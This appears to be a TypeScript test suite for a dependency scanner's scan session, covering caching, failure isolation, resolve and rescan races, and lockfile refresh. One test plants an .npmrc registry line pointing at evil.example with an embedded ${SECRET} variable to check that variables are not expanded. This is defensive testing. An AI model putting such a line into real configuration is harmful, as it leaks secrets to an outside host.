import { after, before, describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { cp, mkdtemp, readFile, readdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import type { CommandRunner } from '../src/adapters/command-runner.ts'
import { CACHE_FORMAT, cacheKeyOf, createScanCache } from '../src/scan/scan-cache.ts'
import { startScanSession, type ScanSession } from '../src/scan/scan-session.ts'
import { serializeScan } from '../src/graph/serialize.ts'
import { createFsReader, type FileReader } from '../src/sources/file-reader.ts'
import { createGitReader } from '../src/sources/git-reader.ts'
import { memoryTree } from './helpers/git-tree.ts'

const testDir = path.dirname(fileURLToPath(import.meta.url))
const monolithFixture = path.join(testDir, 'fixtures', 'monolith')
const NPM_PACKAGE_LOCKFILE = 'npm-package/pnpm-lock.yaml'

const throwingRunner: CommandRunner = async () => {
  throw new Error('runner must not be called')
}

function countingReader(inner: FileReader): { reader: FileReader; readsOf(target: string): number } {
  const reads = new Map<string, number>()
  const reader: FileReader = {
    ...inner,
    async readText(target) {
      reads.set(target, (reads.get(target) ?? 0) + 1)
      return inner.readText(target)
    },
  }
  return { reader, readsOf: (target) => reads.get(target) ?? 0 }
}

describe('scan session', () => {
  let sandbox: string
  let repo: string

  before(async () => {
    sandbox = await mkdtemp(path.join(tmpdir(), 'deptrail-session-'))
    repo = path.join(sandbox, 'monolith')
    await cp(monolithFixture, repo, { recursive: true })
  })

  after(async () => {
    await rm(sandbox, { recursive: true, force: true })
  })

  function start(cacheDir: string | null, reader: FileReader = createFsReader(repo), runner: CommandRunner = throwingRunner): Promise<ScanSession> {
    return startScanSession({
      repoPath: repo,
      reader,
      runner,
      cache: cacheDir ? createScanCache(cacheDir) : null,
      env: {},
      userNpmrc: null,
    })
  }

  it('resolves immediately with every root scanning, then completes all of them without a runner', async () => {
    const session = await start(null)
    assert.deepStrictEqual(session.scan.roots.map((root) => root.id), ['legacy/admin', 'npm-package', 'scripts/release', 'services/api'])
    assert.ok(session.scan.roots.every((root) => root.status === 'scanning'))
    await session.ready
    assert.ok(session.scan.roots.every((root) => root.status === 'ready'))
    assert.equal(session.root('npm-package')?.source, 'lockfile')
    assert.equal(session.root('services/api')?.source, 'manifest-only')
    assert.ok(session.root('npm-package')?.config)
    const lockfileVersions = session.index
      .get('semver')
      ?.filter((entry) => ['legacy/admin', 'npm-package'].includes(entry.rootId))
      .map((entry) => `${entry.rootId}:${entry.version}`)
      .sort()
    assert.deepStrictEqual(lockfileVersions, ['legacy/admin:6.3.1', 'npm-package:5.7.2', 'npm-package:7.6.3'])
  })

  it('does not expand environment variables in the project .npmrc when told not to', async () => {
    const tree = memoryTree({ 'package.json': '{"name":"app"}', '.npmrc': 'registry=http://evil.example/${SECRET}/\n' })
    const options = { repoPath: repo, reader: createGitReader(tree.index, tree.readBlob), runner: throwingRunner, cache: null, env: { SECRET: 'token-value' }, userNpmrc: null }
    const commit = await startScanSession({ ...options, expandNpmrcVariables: false })
    await commit.ready
    assert.equal(commit.root('.')?.config?.registry, 'https://registry.npmjs.org/')
    const working = await startScanSession(options)
    await working.ready
    assert.equal(working.root('.')?.config?.registry, 'http://evil.example/token-value/')
  })

  it('carries the skipped submodules into every scan', async () => {
    const tree = memoryTree({ 'package.json': '{"name":"app"}' })
    const options = { repoPath: repo, reader: createGitReader(tree.index, tree.readBlob), runner: throwingRunner, cache: null, env: {}, userNpmrc: null }
    const session = await startScanSession({ ...options, skippedSubmodules: ['vendor/sub'] })
    await session.ready
    assert.deepEqual(session.scan.skippedSubmodules, ['vendor/sub'])
    await session.rescan()
    assert.deepEqual(session.scan.skippedSubmodules, ['vendor/sub'])
    const working = await startScanSession(options)
    assert.equal(working.scan.skippedSubmodules, undefined)
  })

  it('passes useInstalled to every build', async () => {
    const tree = memoryTree({
      'package.json': '{"name":"app","dependencies":{"a":"1.0.0"}}',
      'node_modules/a/package.json': '{"name":"a","version":"1.0.0"}',
    })
    const options = { repoPath: repo, reader: createGitReader(tree.index, tree.readBlob), runner: throwingRunner, cache: null, env: {}, userNpmrc: null }
    const skipping = await startScanSession({ ...options, useInstalled: false })
    await skipping.ready
    assert.equal(skipping.root('.')?.source, 'manifest-only')
    await skipping.resolve('.').catch(() => undefined)
    assert.notEqual(skipping.root('.')?.source, 'installed')
    const walking = await startScanSession(options)
    await walking.ready
    assert.equal(walking.root('.')?.source, 'installed')
  })

  it('reports every root to onRootPublished each time a root becomes ready', async () => {
    const published: string[][] = []
    const session = await startScanSession({
      repoPath: repo,
      reader: createFsReader(repo),
      runner: throwingRunner,
      cache: null,
      env: {},
      userNpmrc: null,
      onRootPublished: (roots) => published.push(roots.map((root) => `${root.id}:${root.status}`)),
    })
    assert.equal(published.length, 0)
    await session.ready
    assert.equal(published.length, 4)
    published.forEach((roots, position) => {
      assert.equal(roots.length, 4)
      assert.equal(roots.filter((entry) => entry.endsWith(':ready')).length, position + 1)
    })
    assert.deepStrictEqual(published.at(-1), ['legacy/admin:ready', 'npm-package:ready', 'scripts/release:ready', 'services/api:ready'])
  })

  it('reports a root that failed to scan to onRootPublished', async () => {
    const inner = createFsReader(repo)
    const reader: FileReader = {
      ...inner,
      async readText(target) {
        if (target === 'legacy/admin/package-lock.json') throw new Error('unreadable lockfile')
        return inner.readText(target)
      },
    }
    const published: string[][] = []
    const session = await startScanSession({
      repoPath: repo,
      reader,
      runner: throwingRunner,
      cache: null,
      env: {},
      userNpmrc: null,
      onRootPublished: (roots) => published.push(roots.map((root) => `${root.id}:${root.status}`)),
    })
    await session.ready
    assert.equal(published.length, 4)
    assert.ok(published.some((roots) => roots.includes('legacy/admin:failed')))
    assert.equal(published.at(-1)?.some((entry) => entry.endsWith(':scanning')), false)
  })

  it('isolates a failing root from the others', async () => {
    const inner = createFsReader(repo)
    const reader: FileReader = {
      ...inner,
      async readText(target) {
        if (target === 'legacy/admin/package-lock.json') throw new Error('unreadable lockfile')
        return inner.readText(target)
      },
    }
    const session = await start(null, reader)
    await session.ready
    assert.equal(session.root('legacy/admin')?.status, 'failed')
    assert.equal(session.root('legacy/admin')?.error, 'unreadable lockfile')
    assert.equal(session.root('npm-package')?.status, 'ready')
    assert.equal(session.index.get('semver')?.some((entry) => entry.rootId === 'legacy/admin'), false)
  })

  it('resolves a root on demand with the runner and rejects unknown roots', async () => {
    const calls: string[] = []
    const runner: CommandRunner = async (command, args, cwd) => {
      calls.push(command)
      if (args[0] === 'install') {
        await writeFile(path.join(cwd, 'pnpm-lock.yaml'), await readFile(path.join(testDir, 'fixtures', 'pnpm', 'v9-workspace.yaml'), 'utf8'))
      }
      return { code: 0, stdout: '', stderr: '' }
    }
    const session = await start(null, createFsReader(repo), runner)
    await session.ready
    assert.equal(calls.length, 0)
    await session.resolve('services/api')
    assert.equal(session.root('services/api')?.source, 'resolved-today')
    assert.equal(session.root('services/api')?.status, 'ready')
    assert.ok(calls.length > 0)
    await assert.rejects(session.resolve('nope'), /Unknown root/)
  })

  it('reuses cached lockfile graphs without parsing and keeps secrets out of the cache', async () => {
    const cacheDir = path.join(sandbox, 'cache')
    const first = await start(cacheDir)
    await first.ready
    const cacheFiles = (await readdir(cacheDir)).filter((name) => name.endsWith('.json'))
    assert.equal(cacheFiles.length, 2)
    for (const name of cacheFiles) {
      const text = await readFile(path.join(cacheDir, name), 'utf8')
      assert.equal(text.includes('fixture-secret-token'), false)
      const parsed = JSON.parse(text) as { id: string; packages: { id: string; name: string; version: string }[]; config?: unknown }
      assert.equal(parsed.config, undefined)
      if (parsed.id === 'npm-package') {
        const target = parsed.packages.find((node) => node.name === 'semver')
        assert.ok(target)
        target.version = '9.9.9-cached'
        await writeFile(path.join(cacheDir, name), JSON.stringify(parsed))
      }
    }
    const counting = countingReader(createFsReader(repo))
    const second = await start(cacheDir, counting.reader)
    await second.ready
    assert.equal(counting.readsOf(NPM_PACKAGE_LOCKFILE), 1)
    assert.ok(second.index.get('semver')?.some((entry) => entry.version === '9.9.9-cached'))
    assert.ok(second.root('npm-package')?.config)
    assert.equal(second.root('npm-package')?.config?.hasAuth, true)
    assert.equal(JSON.stringify(serializeScan(second.scan)).includes('fixture-secret-token'), false)
  })

  it('adds config warnings to the ready root warnings', async () => {
    const session = await startScanSession({
      repoPath: repo,
      reader: createFsReader(repo),
      runner: throwingRunner,
      cache: null,
      env: {},
      userNpmrc: '_authToken=x\n',
    })
    await session.ready
    assert.ok(session.root('npm-package')?.warnings.includes('_authToken in user .npmrc is not scoped to a registry and is ignored'))
  })

  function installingRunner(counter: { calls: number }, gate?: Promise<void>): CommandRunner {
    return async (_command, args, cwd) => {
      counter.calls++
      if (gate) await gate
      if (args[0] === 'install') {
        await writeFile(path.join(cwd, 'pnpm-lock.yaml'), await readFile(path.join(testDir, 'fixtures', 'pnpm', 'v9-workspace.yaml'), 'utf8'))
      }
      return { code: 0, stdout: '', stderr: '' }
    }
  }

  function gateOf(): { gate: Promise<void>; release: () => void } {
    let release: () => void = () => {}
    const gate = new Promise<void>((resolve) => {
      release = resolve
    })
    return { gate, release }
  }

  it('keeps a resolve result when an older initial build finishes later', async () => {
    const inner = createFsReader(repo)
    const { gate, release } = gateOf()
    const heldReached = gateOf()
    let held = false
    const reader: FileReader = {
      ...inner,
      async exists(target) {
        if (target === 'services/api/node_modules' && !held) {
          held = true
          heldReached.release()
          await gate
        }
        return inner.exists(target)
      },
    }
    const session = await start(null, reader, installingRunner({ calls: 0 }))
    await heldReached.gate
    await session.resolve('services/api')
    assert.equal(session.root('services/api')?.source, 'resolved-today')
    release()
    await session.ready
    assert.equal(session.root('services/api')?.source, 'resolved-today')
    assert.equal(session.root('services/api')?.status, 'ready')
  })

  it('marks a root scanning as soon as resolve starts', async () => {
    const { gate, release } = gateOf()
    const session = await start(null, createFsReader(repo), installingRunner({ calls: 0 }, gate))
    await session.ready
    const pending = session.resolve('services/api')
    assert.equal(session.root('services/api')?.status, 'scanning')
    release()
    await pending
    assert.equal(session.root('services/api')?.status, 'ready')
  })

  it('drops a resolve that is overtaken by a rescan', async () => {
    const { gate, release } = gateOf()
    const session = await start(null, createFsReader(repo), installingRunner({ calls: 0 }, gate))
    await session.ready
    const pending = session.resolve('services/api')
    await session.rescan()
    release()
    await pending
    assert.equal(session.root('services/api')?.source, 'manifest-only')
    assert.equal(session.root('services/api')?.status, 'ready')
  })

  it('never spawns a package manager during the initial scan or a rescan', async () => {
    const counter = { calls: 0 }
    const session = await start(null, createFsReader(repo), installingRunner(counter))
    await session.ready
    assert.equal(counter.calls, 0)
    await session.rescan()
    assert.equal(counter.calls, 0)
  })

  it('treats a wrongly shaped cache entry as a miss and still becomes ready', async () => {
    const cacheDir = path.join(sandbox, 'misshaped-cache')
    await (await start(cacheDir)).ready
    for (const name of await readdir(cacheDir)) {
      const parsed = JSON.parse(await readFile(path.join(cacheDir, name), 'utf8')) as { packages: unknown[] }
      parsed.packages = [{}]
      await writeFile(path.join(cacheDir, name), JSON.stringify(parsed))
    }
    const session = await start(cacheDir)
    await session.ready
    assert.equal(session.root('npm-package')?.status, 'ready')
    assert.ok((session.root('npm-package')?.packages.size ?? 0) > 1)
  })

  it('changes the cache key when the cache format changes', () => {
    const current = cacheKeyOf('/repo', 'root', 'lock text')
    assert.equal(current, cacheKeyOf('/repo', 'root', 'lock text', CACHE_FORMAT))
    assert.notEqual(current, cacheKeyOf('/repo', 'root', 'lock text', CACHE_FORMAT + 1))
  })

  it('treats a corrupt cache entry as a miss', async () => {
    const cacheDir = path.join(sandbox, 'corrupt-cache')
    await (await start(cacheDir)).ready
    for (const name of await readdir(cacheDir)) await writeFile(path.join(cacheDir, name), '{not json')
    const session = await start(cacheDir)
    await session.ready
    assert.equal(session.root('npm-package')?.status, 'ready')
    assert.equal(session.root('npm-package')?.source, 'lockfile')
  })

  it('rescans everything and replaces the scan contents', async () => {
    const session = await start(null)
    await session.ready
    const previousScannedAt = session.scan.scannedAt
    await new Promise((resolve) => setTimeout(resolve, 5))
    await session.rescan()
    assert.notEqual(session.scan.scannedAt, previousScannedAt)
    assert.ok(session.scan.roots.every((root) => root.status === 'ready'))
    assert.equal(session.index.get('semver')?.length, 5)
  })

  it('refreshes one root from its changed lockfile and publishes it without a scanning placeholder', async () => {
    const lockfilePath = path.join(repo, NPM_PACKAGE_LOCKFILE)
    const original = await readFile(lockfilePath, 'utf8')
    const published: string[] = []
    const session = await startScanSession({
      repoPath: repo,
      reader: createFsReader(repo),
      runner: throwingRunner,
      cache: null,
      env: {},
      userNpmrc: null,
      onRootPublished: (roots) => published.push(roots.find((root) => root.id === 'npm-package')?.status ?? 'missing'),
    })
    await session.ready
    const before = session.root('npm-package')
    published.length = 0
    try {
      await writeFile(lockfilePath, original.replaceAll('5.7.2', '5.7.3'))
      const refreshing = session.refreshRoot('npm-package')
      assert.equal(session.root('npm-package'), before)
      await refreshing
      const after = session.root('npm-package')
      assert.notEqual(after, before)
      assert.equal(after?.status, 'ready')
      assert.equal(after?.packages.has('semver@5.7.3'), true)
      assert.equal(after?.packages.has('semver@5.7.2'), false)
      assert.deepStrictEqual(published, ['ready'])
      assert.ok(session.index.get('semver')?.some((entry) => entry.rootId === 'npm-package' && entry.version === '5.7.3'))
    } finally {
      await writeFile(lockfilePath, original)
    }
    await assert.rejects(session.refreshRoot('nope'), /Unknown root nope/)
  })
})
